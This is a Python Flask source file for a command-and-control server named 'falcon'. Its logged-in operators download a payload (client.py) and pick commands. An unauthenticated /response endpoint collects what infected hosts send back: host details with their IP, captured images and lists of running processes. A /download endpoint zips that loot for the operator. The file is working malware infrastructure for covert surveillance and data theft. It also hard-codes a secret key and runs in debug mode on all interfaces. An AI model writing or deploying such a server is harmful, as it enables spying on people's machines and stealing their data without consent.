""" Required Imports """
from flask import Flask, request, redirect, render_template
from flask.globals import session
from flask.helpers import flash, send_file
from flask.json import jsonify, dump
from flask_session import Session
from werkzeug.utils import secure_filename
from database import DBManager
import os
from zipfile import ZipFile

app = Flask(__name__)
app.config["SECRET_KEY"] = "1b43c28ceedb6839c6d9"
app.config["UPLOAD_FOLDER"] = "./uploads/"
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

if not os.path.isdir("uploads"):
    os.mkdir("uploads")

db = DBManager()
command_option = 0


@app.route("/", methods=["POST", "GET"])
def index():
    """ Home Page """
    return render_template("index.html")


@app.route("/login", methods=["POST", "GET"])
def login():
    """ Login Page """
    if session.get("user"):
        return redirect("get-started")

    if request.method == "POST":
        credentials = request.form

        if not credentials.get("admin-id") or \
                not credentials.get("password"):
            flash("Invalid Credentials! Please try again.")
        else:
            admin_id = credentials.get("admin-id")
            password = credentials.get("password")

            user_record = db.is_present(admin_id)
            if user_record:
                if db.validate_user(admin_id, password):
                    session["user"] = admin_id
                    return redirect("get-started")
                flash("Invalid Credentials! Please try again.")
            else:
                flash("No record found! Please register first.")

    return render_template("login.html")


@app.route("/register", methods=["POST", "GET"])
def register():
    """ Register Page """
    if session.get("user"):
        return redirect("get-started")

    if request.method == "POST":
        credentials = request.form
        admin_id = credentials.get("admin-id")
        password = credentials.get("password")
        confirm_pass = credentials.get("confirm-pass")
        email = credentials.get("email")

        if not admin_id or not password or \
                not confirm_pass or not email:
            flash("Please fill in the required fields!")
        else:
            if len(password) < 6:
                flash("Length of password should be >= 6!")
            elif password != confirm_pass:
                flash("Password mismatch!")
            else:
                user_record = db.is_present(admin_id)
                if user_record:
                    flash("You are already registered! Please log-in to continue.")
                else:
                    db.add_user(admin_id, password, email)
                    flash("Account successfully created! You may log-in now.")

                return redirect("login")

    return render_template("register.html")


@app.route("/get-started", methods=["POST", "GET"])
def get_started():
    """ Get started Page """
    global command_option
    command_option = 0
    if not session.get("user"):
        return redirect("login")
    flash(
        f"Welcome {session.get('user')}. Your falcon is waiting for your commands.")
    return render_template("get_started.html")


@app.route("/dashboard", methods=["POST", "GET"])
def dashboard():
    """ Dashboard Page """
    global command_option
    if not session.get("user"):
        return redirect("login")

    if request.method == "POST":
        command_option = int(request.form.get("select_action"))
        return render_template("dashboard.html",
                               command_option=command_option)
    return render_template("dashboard.html", command_option=-1)


@app.route("/payload", methods=["POST", "GET"])
def payload():
    """ Payload download endpoint """
    if not session.get("user"):
        return redirect("login")

    return send_file("client.py", as_attachment=True)


@app.route("/download", methods=["POST", "GET"])
def download():
    """ Download attachments endpoint """
    if not session.get("user"):
        return redirect("login")

    files = os.listdir(app.config["UPLOAD_FOLDER"])
    if files:
        file_paths = [os.path.join(
            app.config["UPLOAD_FOLDER"], file) for file in files]
        zip_name = "falcon_report.zip"
        with ZipFile(zip_name, "w") as zipped:
            for path in file_paths:
                zipped.write(path)

        while file_paths:
            os.remove(file_paths.pop())

    return send_file(zip_name, as_attachment=True)


@app.route("/response", methods=["POST", "GET"])
def response():
    """ Payload's response endpoint """
    if request.method == "POST":
        if command_option == 1:
            host_info = request.get_json(force=True)
            host_info["IP"] = request.remote_addr
            file_path = os.path.join(
                app.config["UPLOAD_FOLDER"], "host_info.txt")
            with open(file_path, "w") as file:
                dump(host_info, file, indent=4)

        elif command_option in (2, 4):
            img = request.files["image"]
            img_name = secure_filename(img.filename)
            img.save(os.path.join(app.config["UPLOAD_FOLDER"], img_name))

        elif command_option == 3:
            processes_info = request.get_json(force=True)
            file_path = os.path.join(
                app.config["UPLOAD_FOLDER"], "background_processes.txt")
            with open(file_path, "w") as file:
                dump(processes_info, file, indent=4)

    json_res = jsonify({"action": command_option})
    return json_res


@app.route("/logout", methods=["POST", "GET"])
def logout():
    """ Logout endpoint """
    global command_option
    if "user" in session:
        command_option = 0
        session.clear()
    return redirect("/")


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
